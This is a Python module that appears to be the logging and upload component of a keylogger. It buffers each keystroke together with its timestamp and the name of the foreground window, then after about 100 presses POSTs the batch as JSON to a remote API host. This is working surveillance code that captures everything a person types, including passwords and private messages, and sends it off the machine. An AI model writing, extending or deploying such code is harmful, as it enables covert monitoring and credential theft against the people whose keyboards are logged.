'''
Handles storing of keyevents and pushing to backend
'''

import json
import requests
import re
'''
Event manager class that pushes to server side
Pushes to backend after every 100 key presses and after a break character (To ensure backend word processing is done correctly)
'''
class EventManager:
    def __init__ (self, cfg):
        self.history = {}
        self.historyCount = 0
        self.historyThreshold = 100
        self.main_cfg = cfg
    
    
    def addEvent(self, keyEvent):
        if type(keyEvent) == KeyEvent:
            print("appending")
            self.__pushEvent(keyEvent)
        else:
            pass    
    '''
        event: KeyEvent
    '''
    def __pushEvent(self, event):
        # append event to history
        # if historythreshold is hit and last key-press is a Space or Return, push to backend
        print(self.historyCount)
        self.history[self.historyCount] = event
        self.historyCount += 1
        
        if (self.historyCount >= self.historyThreshold):
            if event.keyName == "Space" or event.keyName == "Return":
                self.__pushHistoryToBackend()

    def __pushHistoryToBackend(self):
        try:
            print("Pushing data to backend")
            payload = {}
            i = 0
            for e in range(self.historyCount):
                payload[e] = self.history[e].toJSON()
            
            self.history = {}
            self.historyCount = 0
            
            jsonObj= json.dumps(payload)
            print(jsonObj)
            url = self.main_cfg['apiHost'] + self.main_cfg['endpointPushKeys']
            res = requests.post(url, jsonObj)
            
            return 0
        except Exception as e:
            print("Error pushing to backend", e)
            return 1

'''
KeyEvent class creates the key and includes all relevant fields to be pushed to the backend.
Processes the key and checks that the ascii character is not a special key (e.g. space or return) as pushing this to database affects collection
'''
class KeyEvent:
    def __init__(self,datetime, epochTime, isKeyDown, windowName, asciiCode, asciiChar, keyName, isCaps, processedKey):
        self.datetime = datetime # datetime in format "%d/%m/%Y %H:%M:%S"
        self.epochTime = epochTime # epoch seconds
        self.isKeyDown = isKeyDown # e.g. 'key up' or 'key down'
        self.windowName = windowName # Name of the foreground window at the time of the event
        self.asciiCode = asciiCode # integer
        self.asciiChar = self.checkSpecial(asciiCode,asciiChar) # char
        self.keyName = keyName # string
        self.isCaps = isCaps # isCapital?
        self.processedKey = self.checkSpecial(asciiCode,processedKey) # `asciiChar` after parsing with caps
        
    def __str__(self):
        return f"KeyEvent(\n\tdatetime: {self.datetime}\n\tepochTime: {self.epochTime}\n\tisKeyDown: {self.isKeyDown}\n\twindowName: {self.windowName}\n\tasciiCode: {self.asciiCode}\n\tasciiChar: {self.asciiChar}\n\tkeyName: {self.keyName}\n\tisCaps: {self.isCaps}\n\tprocessedKey: {self.processedKey}\n)"
        
    def toJSON(self):
        res = {}
        res["datetime"] = self.datetime
        res["epochTime"] = self.epochTime
        res["isKeyDown"] = self.isKeyDown
        res["windowName"] = self.windowName
        res["asciiCode"] = self.asciiCode
        res["asciiChar"] = self.asciiChar
        res["keyName"] = self.keyName
        res["isCaps"] = self.isCaps
        res["processedKey"] = self.processedKey
        return json.dumps(res)
    '''
    Only return keys which have valid Ascii codes, otherwise it will affect populating the SQL database
    '''
    def checkSpecial(self,code,key):
        if(code < 127 and code > 32):
            return key
        else:
            return None
